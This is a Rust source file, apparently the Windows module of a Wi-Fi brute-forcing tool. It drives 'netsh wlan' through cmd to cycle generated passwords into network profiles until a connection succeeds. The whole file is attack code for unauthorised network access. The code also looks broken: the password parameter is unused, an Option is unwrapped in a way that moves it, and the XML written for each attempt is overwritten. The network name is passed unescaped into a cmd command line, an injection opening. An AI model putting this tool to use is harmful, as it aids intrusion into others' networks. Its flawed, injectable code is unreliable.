use handlers::NetworkXmlProfileHandler;
use network::Network;
use std::fs;
use std::io;
use std::process::Command;
use wifi::WifiBruteforcer;

pub struct Windows {
  name: String,
}

impl Windows {
  pub fn new(name: String) -> Result<Self, io::Error> {
    let profile_file_name = format!("netsh wlan add profile filename=\"{}\"", name);

    Command::new("cmd")
      .args(&["/C", &profile_file_name[..]])
      .output()?;

    Ok(Windows { name })
  }
}

impl Network for Windows {
  // type Machine = Self;
  fn connect(&self, password: &str) -> bool {
    let ssid = format!("netsh wlan connect name=\"{}\"", self.name);
    let output = Command::new("cmd").args(&["/C", &ssid[..]]).output();

    match output {
      Ok(res) => res.status.success(),
      Err(_) => false,
    }
  }

  fn perform_attack(&self, bruteforcer: &mut WifiBruteforcer) -> Result<Option<String>, io::Error> {
    if bruteforcer.xml_handler.is_none() {
      bruteforcer.xml_handler = Some(NetworkXmlProfileHandler::new()?);
    }

    // this safe to unwrap because of handling above
    let original_xml_data = bruteforcer.xml_handler.unwrap().content.clone().unwrap();

    // Generate password combination
    let trial_passwords = bruteforcer.generate_all_possible_password();

    // This needs GREAT improvement:
    // Better approach: ?
    for password in trial_passwords.iter() {
      // Clone data
      let mut temp_data = original_xml_data.clone();

      // Replace SSID and password
      let mut temp_data = temp_data.replace("{SSID}", bruteforcer.config.ssid);
      let temp_data = temp_data.replace("{password}", password);
      fs::write(bruteforcer.output_xml_path, &temp_data)?;

      // Write details to new xml file
      // THIS NEEDS TO BE MOVED TO A DIFFERENT METHOD (AS THIS ONLY WORKS FOR WINDOWS MACHINE)
      bruteforcer
        .xml_handler
        .as_mut()
        .unwrap()
        .to_file(bruteforcer.output_xml_path)?;

      if self.connect(password) {
        return Ok(Some(password.to_string()));
      }
    }

    Ok(None)
  }
}
